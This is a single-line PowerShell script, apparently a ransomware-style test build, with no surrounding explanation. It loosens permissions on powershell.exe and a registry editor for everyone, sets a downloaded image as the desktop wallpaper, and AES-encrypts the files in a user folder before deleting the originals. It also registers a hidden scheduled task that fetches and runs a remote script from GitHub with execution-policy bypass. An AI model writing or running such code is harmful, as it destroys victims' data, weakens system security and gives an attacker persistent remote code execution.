Import-Module -Name Microsoft.PowerShell.Security; $shell = New-Object -ComObject Shell.Application; $shell.ShellExecute("powershell.exe", "/c", "echo y| cacls C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /e /p everyone:f"); $shell.ShellExecute("powershell.exe", "/c", "echo y| cacls C:\Windows\System32\regedit32.exe /e /p everyone:f"); Add-Type -AssemblyName Microsoft.PowerShell.Security; $mp = [PSCustomObject]@{DisableRealtimeMonitoring = $true}; $dirPath="C:\directory"; mkdir $dirPath; $wallpaperUrl="https://www.ncsc.gov.uk/images/library/iStock-1420039900.jpg"; $wallpaperPath="$dirPath\wallpaper.jpg"; if (-Not (Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath | Out-Null }; if (-Not (Test-Path $wallpaperPath)) { Invoke-WebRequest -Uri $wallpaperUrl -OutFile $wallpaperPath } else { Write-Output "Wallpaper already exists: $wallpaperPath" }; Invoke-WebRequest -Uri $wallpaperUrl -OutFile $wallpaperPath; Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "Wallpaper" -Value $wallpaperPath; $definition='using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport("user32.dll", CharSet=CharSet.Auto)] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); [DllImport("user32.dll")] public static extern int SendMessageTimeout(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam, int fuFlags, int uTimeout, out IntPtr lpdwResult); }'; Add-Type -TypeDefinition $definition; [Wallpaper]::SystemParametersInfo(20,0,$wallpaperPath,3); [IntPtr]$HWND_BROADCAST=[IntPtr]0xffff; [IntPtr]$Result=[IntPtr]::Zero; [Wallpaper]::SendMessageTimeout($HWND_BROADCAST,0x001A,[IntPtr]::Zero,[IntPtr]::Zero,2,5000,[ref]$Result); $definition='using System; using System.Security.Cryptography; using System.Text; public class CryptoHelper { public static string GetHash(string input) { using (SHA256 sha256 = SHA256.Create()) { byte[] bytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(input)); return BitConverter.ToString(bytes).Replace("-", ""); } } }'; Add-Type -TypeDefinition $definition; $folderToEncrypt="C:\Users\Laurence\test\*"; $passphrase="your_secret_key_here"; $encryptionKey=[System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($passphrase)); Get-ChildItem -Path $folderToEncrypt -Recurse | ForEach-Object { $fileOrFolder=$_.FullName; if (Test-Path -Path $fileOrFolder -PathType Leaf) { $aes=[System.Security.Cryptography.Aes]::Create(); $aes.Key=$encryptionKey[0..($aes.KeySize/8-1)]; $aes.GenerateIV(); $content=[System.IO.File]::ReadAllBytes($fileOrFolder); $encryptor=$aes.CreateEncryptor(); $encryptedContent=$encryptor.TransformFinalBlock($content,0,$content.Length); $finalData=$aes.IV+$encryptedContent; $newFileName=[System.IO.Path]::GetFileNameWithoutExtension($_.Name)+".encrypted"; $newFilePath=[System.IO.Path]::Combine([System.IO.Path]::GetDirectoryName($fileOrFolder),$newFileName); [System.IO.File]::WriteAllBytes($newFilePath,$finalData); if (Test-Path -Path $newFilePath) { Remove-Item -Path $fileOrFolder -Force; Write-Output "Encrypted and deleted: $fileOrFolder" } else { Write-Output "Encryption failed for: $fileOrFolder" } } }; $action = New-ScheduledTaskAction -Execute "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" /c "powershell -w Hidden -c & powershell -ArgumentList '-ep Bypass -w Hidden -c iex (iwr https://raw.githubusercontent.com/LaurenceThornber/startupscript/refs/heads/main/startupscript.ps1 -UseBasicParsing).Content'"; $trigger = New-ScheduledTaskTrigger -At 12:00 -Once; $task = Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "StartUp" -Force
